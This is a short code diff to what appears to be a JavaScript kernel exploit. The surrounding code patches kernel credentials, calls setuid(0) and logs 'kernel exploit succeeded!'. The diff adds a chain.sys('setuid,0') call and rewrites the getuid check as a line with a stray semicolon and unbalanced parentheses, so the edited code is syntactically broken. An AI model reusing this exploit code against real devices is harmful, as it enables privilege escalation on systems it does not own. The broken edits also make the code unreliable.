@@ -1611,6 +1611,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
 
     log('setuid(0)');
     sysi('setuid', 0);
+    chain.sys('setuid,0');
     log('kernel exploit succeeded!');
     localStorage.ExploitLoaded="yes"
     sessionStorage.ExploitLoaded="yes"
@@ -1729,7 +1730,7 @@ function runBinLoader() {
 //
 // the exploit implementation also assumes that we are pinned to one core
 export async function kexploit() {
-      if ((sysi('getuid') != 0)) {
+      if (chain.sys('getuid'); != 0)) {
         localStorage.ExploitLoaded="no"
     }
     const _init_t1 = performance.now();
